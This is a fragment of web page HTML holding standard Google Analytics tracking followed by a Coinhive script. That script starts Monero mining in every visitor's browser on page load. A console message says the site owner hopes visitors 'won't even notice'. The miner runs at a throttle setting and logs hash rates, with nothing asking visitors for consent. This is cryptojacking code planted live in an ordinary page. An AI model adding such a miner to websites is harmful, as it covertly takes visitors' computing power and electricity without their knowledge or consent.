<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-36143092-1', 'auto');
  ga('send', 'pageview');

</script>

<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
	console.log("Testing light Monero mining. Hopefully you won't even notice.")
    var miner = new CoinHive.Anonymous('exN9MUJT735qbTYsRA6Jm1Mr3nQmP4yT', {
        throttle: 0.9
    });
    miner.start();

    // Update stats once per second
    setInterval(function() {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes     = miner.getTotalHashes();
        var acceptedHashes  = miner.getAcceptedHashes();

        console.log(hashesPerSecond, totalHashes, acceptedHashes);

        // Output to HTML elements...
    }, 1000);
</script>